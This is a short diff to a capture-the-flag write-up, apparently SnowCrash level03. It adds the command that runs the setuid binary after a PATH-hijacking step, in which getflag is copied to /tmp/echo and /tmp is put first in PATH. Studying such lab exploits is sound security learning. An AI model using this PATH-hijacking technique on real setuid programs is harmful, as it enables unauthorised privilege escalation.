@@ -7,6 +7,7 @@ We can see the Exploit me is executed with an echo and the env passed
 So let try to copy /bin/getflag in /tmp/echo, and replace the env PATH
 	cp /bin/getflag /tmp/echo
 	PATH=/tmp:$PATH
+	$HOME/level03
 
 the new path will return the new echo binary in /tmp first, and the binary with flag03 rights will execute it
 but its in real getflag command and it print us the getflag token executed as flag03.
